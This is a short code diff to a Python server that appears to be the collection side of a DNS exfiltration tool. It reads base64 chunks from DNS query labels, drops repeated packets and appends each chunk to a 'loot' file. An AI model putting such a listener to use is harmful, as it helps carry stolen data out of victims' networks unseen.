@@ -32,7 +32,12 @@ class Server:
                 else:
                     encoded_data = incoming_data.split('.')[0]
 
-                print base64.b64decode(encoded_data)
+                if encoded_data == self.last_packet:
+                    pass
+                else:
+                    with open(self.loot_path + self.file_name, 'a') as dns_out:
+                        dns_out.write(encoded_data)
+                    self.last_packet = encoded_data
 
             except TypeError:
                 pass
